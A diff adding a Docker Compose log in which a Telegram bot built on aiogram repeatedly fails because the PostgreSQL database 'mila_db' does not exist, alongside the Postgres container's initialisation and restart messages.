@@ -1,0 +1,972 @@
+bot-1  |     return await _acquire_impl()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 830, in _acquire_impl
+bot-1  |     proxy = await ch.acquire()  # type: PoolConnectionProxy
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 137, in acquire
+bot-1  |     await self.connect()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 129, in connect
+bot-1  |     self._con = await self._pool._get_new_connection()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 528, in _get_new_connection
+bot-1  |     con = await connect_utils._connect_addr(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 808, in _connect_addr
+bot-1  |     return await __connect_addr(params, timeout, True, *args)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 866, in __connect_addr
+bot-1  |     await compat.wait_for(connected, timeout=timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/compat.py", line 60, in wait_for
+bot-1  |     return await asyncio.wait_for(fut, timeout)
+bot-1  |   File "/usr/local/lib/python3.10/asyncio/tasks.py", line 445, in wait_for
+bot-1  |     return fut.result()
+bot-1  | asyncpg.exceptions.InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Cause exception while process update id=755596883 by bot id=8021682059
+bot-1  | InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Traceback (most recent call last):
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 297, in _process_update     
+bot-1  |     response = await self.feed_update(bot, update, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 146, in feed_update
+bot-1  |     response = await self.update.wrap_outer_middleware(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/error.py", line 25, in __call__      
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/user_context.py", line 23, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/fsm/middleware.py", line 39, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 264, in _listen_update      
+bot-1  |     return await self.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 131, in _propagate_event        
+bot-1  |     response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 124, in _propagate_event        
+bot-1  |     response = await observer.trigger(event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/app/src/handlers.py", line 30, in process_name
+bot-1  |     async with pool.acquire() as conn:
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 1005, in __aenter__
+bot-1  |     self.connection = await self.pool._acquire(self.timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 845, in _acquire
+bot-1  |     return await _acquire_impl()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 830, in _acquire_impl
+bot-1  |     proxy = await ch.acquire()  # type: PoolConnectionProxy
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 137, in acquire
+bot-1  |     await self.connect()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 129, in connect
+bot-1  |     self._con = await self._pool._get_new_connection()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 528, in _get_new_connection
+bot-1  |     con = await connect_utils._connect_addr(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 808, in _connect_addr
+bot-1  |     return await __connect_addr(params, timeout, True, *args)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 866, in __connect_addr
+bot-1  |     await compat.wait_for(connected, timeout=timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/compat.py", line 60, in wait_for
+bot-1  |     return await asyncio.wait_for(fut, timeout)
+bot-1  |   File "/usr/local/lib/python3.10/asyncio/tasks.py", line 445, in wait_for
+bot-1  |     return fut.result()
+bot-1  | asyncpg.exceptions.InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Cause exception while process update id=755596885 by bot id=8021682059
+bot-1  | InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Traceback (most recent call last):
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 297, in _process_update     
+bot-1  |     response = await self.feed_update(bot, update, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 146, in feed_update
+bot-1  |     response = await self.update.wrap_outer_middleware(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/error.py", line 25, in __call__      
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/user_context.py", line 23, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/fsm/middleware.py", line 39, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 264, in _listen_update      
+bot-1  |     return await self.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 131, in _propagate_event        
+bot-1  |     response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 124, in _propagate_event        
+bot-1  |     response = await observer.trigger(event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/app/src/handlers.py", line 30, in process_name
+bot-1  |     async with pool.acquire() as conn:
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 1005, in __aenter__
+bot-1  |     self.connection = await self.pool._acquire(self.timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 845, in _acquire
+bot-1  |     return await _acquire_impl()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 830, in _acquire_impl
+bot-1  |     proxy = await ch.acquire()  # type: PoolConnectionProxy
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 137, in acquire
+bot-1  |     await self.connect()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 129, in connect
+bot-1  |     self._con = await self._pool._get_new_connection()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 528, in _get_new_connection
+bot-1  |     con = await connect_utils._connect_addr(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 808, in _connect_addr
+bot-1  |     return await __connect_addr(params, timeout, True, *args)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 866, in __connect_addr
+bot-1  |     await compat.wait_for(connected, timeout=timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/compat.py", line 60, in wait_for
+bot-1  |     return await asyncio.wait_for(fut, timeout)
+bot-1  |   File "/usr/local/lib/python3.10/asyncio/tasks.py", line 445, in wait_for
+bot-1  |     return fut.result()
+bot-1  | asyncpg.exceptions.InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Cause exception while process update id=755596887 by bot id=8021682059
+bot-1  | InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Traceback (most recent call last):
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 297, in _process_update     
+bot-1  |     response = await self.feed_update(bot, update, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 146, in feed_update
+bot-1  |     response = await self.update.wrap_outer_middleware(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/error.py", line 25, in __call__      
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/user_context.py", line 23, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/fsm/middleware.py", line 39, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 264, in _listen_update      
+bot-1  |     return await self.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 131, in _propagate_event        
+bot-1  |     response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 124, in _propagate_event        
+bot-1  |     response = await observer.trigger(event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/app/src/handlers.py", line 30, in process_name
+bot-1  |     async with pool.acquire() as conn:
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 1005, in __aenter__
+bot-1  |     self.connection = await self.pool._acquire(self.timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 845, in _acquire
+bot-1  |     return await _acquire_impl()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 830, in _acquire_impl
+bot-1  |     proxy = await ch.acquire()  # type: PoolConnectionProxy
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 137, in acquire
+bot-1  |     await self.connect()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 129, in connect
+bot-1  |     self._con = await self._pool._get_new_connection()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 528, in _get_new_connection
+bot-1  |     con = await connect_utils._connect_addr(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 808, in _connect_addr
+bot-1  |     return await __connect_addr(params, timeout, True, *args)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 866, in __connect_addr
+bot-1  |     await compat.wait_for(connected, timeout=timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/compat.py", line 60, in wait_for
+bot-1  |     return await asyncio.wait_for(fut, timeout)
+bot-1  |   File "/usr/local/lib/python3.10/asyncio/tasks.py", line 445, in wait_for
+bot-1  |     return fut.result()
+bot-1  | asyncpg.exceptions.InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Cause exception while process update id=755596889 by bot id=8021682059
+bot-1  | InvalidCatalogNameError: database "mila_db" does not exist
+bot-1  | Traceback (most recent call last):
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 297, in _process_update     
+bot-1  |     response = await self.feed_update(bot, update, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 146, in feed_update
+bot-1  |     response = await self.update.wrap_outer_middleware(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/error.py", line 25, in __call__      
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/middlewares/user_context.py", line 23, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/fsm/middleware.py", line 39, in __call__
+bot-1  |     return await handler(event, data)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/dispatcher.py", line 264, in _listen_update      
+bot-1  |     return await self.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 131, in _propagate_event        
+bot-1  |     response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 115, in propagate_event
+bot-1  |     return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 111, in _wrapped
+bot-1  |     return await self._propagate_event(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/router.py", line 124, in _propagate_event        
+bot-1  |     response = await observer.trigger(event, **kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/telegram.py", line 123, in trigger
+bot-1  |     return await wrapped_inner(event, kwargs)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/aiogram/dispatcher/event/handler.py", line 42, in call
+bot-1  |     return await wrapped()
+bot-1  |   File "/app/src/handlers.py", line 30, in process_name
+bot-1  |     async with pool.acquire() as conn:
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 1005, in __aenter__
+bot-1  |     self.connection = await self.pool._acquire(self.timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 845, in _acquire
+bot-1  |     return await _acquire_impl()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 830, in _acquire_impl
+bot-1  |     proxy = await ch.acquire()  # type: PoolConnectionProxy
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 137, in acquire
+bot-1  |     await self.connect()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 129, in connect
+bot-1  |     self._con = await self._pool._get_new_connection()
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/pool.py", line 528, in _get_new_connection
+bot-1  |     con = await connect_utils._connect_addr(
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 808, in _connect_addr
+bot-1  |     return await __connect_addr(params, timeout, True, *args)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/connect_utils.py", line 866, in __connect_addr
+bot-1  |     await compat.wait_for(connected, timeout=timeout)
+bot-1  |   File "/usr/local/lib/python3.10/site-packages/asyncpg/compat.py", line 60, in wait_for
+bot-1  |     return await asyncio.wait_for(fut, timeout)
+bot-1  |   File "/usr/local/lib/python3.10/asyncio/tasks.py", line 445, in wait_for
+bot-1  |     return fut.result()
+bot-1  | asyncpg.exceptions.InvalidCatalogNameError: database "mila_db" does not exist
+postgres-1  | The files belonging to this database system will be owned by user "postgres".
+postgres-1  | This user must also own the server process.
+postgres-1  |
+postgres-1  | The database cluster will be initialized with locale "en_US.utf8".
+postgres-1  | The default database encoding has accordingly been set to "UTF8".
+postgres-1  | The default text search configuration will be set to "english".
+postgres-1  |
+postgres-1  | Data page checksums are disabled.
+postgres-1  |
+postgres-1  | fixing permissions on existing directory /var/lib/postgresql/data ... ok
+postgres-1  | creating subdirectories ... ok
+postgres-1  | selecting dynamic shared memory implementation ... posix
+postgres-1  | selecting default max_connections ... 100
+postgres-1  | selecting default shared_buffers ... 128MB
+postgres-1  | selecting default time zone ... UTC
+postgres-1  | creating configuration files ... ok
+postgres-1  | running bootstrap script ... ok
+postgres-1  | sh: locale: not found
+postgres-1  | 2025-08-31 12:02:04.101 UTC [33] WARNING:  no usable system locales were found
+postgres-1  | performing post-bootstrap initialization ... ok
+postgres-1  | syncing data to disk ... ok
+postgres-1  | initdb: warning: enabling "trust" authentication for local connections
+postgres-1  | You can change this by editing pg_hba.conf or using the option -A, or
+postgres-1  | --auth-local and --auth-host, the next time you run initdb.
+postgres-1  |
+postgres-1  |
+postgres-1  | Success. You can now start the database server using:
+postgres-1  |
+postgres-1  |     pg_ctl -D /var/lib/postgresql/data -l logfile start
+postgres-1  |
+postgres-1  | waiting for server to start....2025-08-31 12:02:06.434 UTC [39] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:02:06.447 UTC [39] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:02:06.468 UTC [40] LOG:  database system was shut down at 2025-08-31 12:02:06 UTC
+postgres-1  | 2025-08-31 12:02:06.485 UTC [39] LOG:  database system is ready to accept connections
+postgres-1  |  done
+postgres-1  | server started
+postgres-1  | CREATE DATABASE
+postgres-1  |
+postgres-1  |
+postgres-1  | /usr/local/bin/docker-entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*
+postgres-1  |
+postgres-1  | 2025-08-31 12:02:06.726 UTC [39] LOG:  received fast shutdown request
+postgres-1  | waiting for server to shut down....2025-08-31 12:02:06.732 UTC [39] LOG:  aborting any active transactions     
+postgres-1  | 2025-08-31 12:02:06.750 UTC [39] LOG:  background worker "logical replication launcher" (PID 46) exited with exit code 1
+postgres-1  | 2025-08-31 12:02:06.752 UTC [41] LOG:  shutting down
+postgres-1  | 2025-08-31 12:02:06.794 UTC [39] LOG:  database system is shut down
+postgres-1  |  done
+postgres-1  | server stopped
+postgres-1  |
+postgres-1  | PostgreSQL init process complete; ready for start up.
+postgres-1  |
+postgres-1  | 2025-08-31 12:02:06.889 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:02:06.890 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:02:06.890 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:02:06.901 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:02:06.912 UTC [54] LOG:  database system was shut down at 2025-08-31 12:02:06 UTC
+postgres-1  | 2025-08-31 12:02:06.935 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  | 2025-08-31 12:02:20.548 UTC [1] LOG:  received fast shutdown request
+postgres-1  | 2025-08-31 12:02:20.551 UTC [1] LOG:  aborting any active transactions
+postgres-1  | 2025-08-31 12:02:20.581 UTC [1] LOG:  background worker "logical replication launcher" (PID 60) exited with exit code 1
+postgres-1  | 2025-08-31 12:02:20.583 UTC [55] LOG:  shutting down
+postgres-1  | 2025-08-31 12:02:20.640 UTC [1] LOG:  database system is shut down
+postgres-1  |
+postgres-1  | PostgreSQL Database directory appears to contain a database; Skipping initialization
+postgres-1  |
+postgres-1  | 2025-08-31 12:02:24.800 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:02:24.802 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:02:24.802 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:02:24.812 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:02:24.825 UTC [25] LOG:  database system was shut down at 2025-08-31 12:02:20 UTC
+postgres-1  | 2025-08-31 12:02:24.873 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  | 2025-08-31 12:02:29.587 UTC [1] LOG:  received fast shutdown request
+postgres-1  | 2025-08-31 12:02:29.598 UTC [1] LOG:  aborting any active transactions
+postgres-1  | 2025-08-31 12:02:29.628 UTC [39] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.635 UTC [37] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.639 UTC [35] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.640 UTC [33] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.647 UTC [36] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.653 UTC [41] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.667 UTC [38] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.673 UTC [34] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.685 UTC [32] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.696 UTC [40] FATAL:  terminating connection due to administrator command
+postgres-1  | 2025-08-31 12:02:29.918 UTC [1] LOG:  background worker "logical replication launcher" (PID 31) exited with exit code 1
+postgres-1  | 2025-08-31 12:02:29.945 UTC [26] LOG:  shutting down
+postgres-1  | 2025-08-31 12:02:30.024 UTC [1] LOG:  database system is shut down
+postgres-1  |
+postgres-1  | PostgreSQL Database directory appears to contain a database; Skipping initialization
+postgres-1  |
+postgres-1  | 2025-08-31 12:02:55.586 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:02:55.586 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:02:55.586 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:02:55.596 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:02:55.611 UTC [24] LOG:  database system was shut down at 2025-08-31 12:02:29 UTC
+postgres-1  | 2025-08-31 12:02:55.668 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  | 2025-08-31 12:23:58.284 UTC [1] LOG:  received fast shutdown request
+postgres-1  | 2025-08-31 12:23:58.289 UTC [1] LOG:  aborting any active transactions
+postgres-1  | 2025-08-31 12:23:58.304 UTC [1] LOG:  background worker "logical replication launcher" (PID 30) exited with exit code 1
+postgres-1  | 2025-08-31 12:23:58.307 UTC [25] LOG:  shutting down
+postgres-1  | 2025-08-31 12:23:58.351 UTC [1] LOG:  database system is shut down
+postgres-1  |
+postgres-1  | PostgreSQL Database directory appears to contain a database; Skipping initialization
+postgres-1  |
+postgres-1  | 2025-08-31 12:24:02.086 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:24:02.089 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:24:02.089 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:24:02.102 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:24:02.128 UTC [25] LOG:  database system was shut down at 2025-08-31 12:23:58 UTC
+postgres-1  | 2025-08-31 12:24:02.176 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  | 2025-08-31 12:24:32.446 UTC [1] LOG:  received fast shutdown request
+postgres-1  | 2025-08-31 12:24:32.450 UTC [1] LOG:  aborting any active transactions
+postgres-1  | 2025-08-31 12:24:32.484 UTC [1] LOG:  background worker "logical replication launcher" (PID 31) exited with exit code 1
+postgres-1  | 2025-08-31 12:24:32.486 UTC [26] LOG:  shutting down
+postgres-1  | 2025-08-31 12:24:32.547 UTC [1] LOG:  database system is shut down
+postgres-1  |
+postgres-1  | PostgreSQL Database directory appears to contain a database; Skipping initialization
+postgres-1  |
+postgres-1  | 2025-08-31 12:24:41.320 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:24:41.322 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:24:41.322 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:24:41.330 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:24:41.343 UTC [25] LOG:  database system was shut down at 2025-08-31 12:24:32 UTC
+postgres-1  | 2025-08-31 12:24:41.384 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  | 2025-08-31 12:39:15.499 UTC [1] LOG:  received fast shutdown request
+postgres-1  | 2025-08-31 12:39:15.507 UTC [1] LOG:  aborting any active transactions
+postgres-1  | 2025-08-31 12:39:15.536 UTC [1] LOG:  background worker "logical replication launcher" (PID 31) exited with exit code 1
+postgres-1  | 2025-08-31 12:39:15.540 UTC [26] LOG:  shutting down
+postgres-1  | 2025-08-31 12:39:15.574 UTC [1] LOG:  database system is shut down
+postgres-1  |
+postgres-1  | PostgreSQL Database directory appears to contain a database; Skipping initialization
+postgres-1  |
+postgres-1  | 2025-08-31 12:52:04.860 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
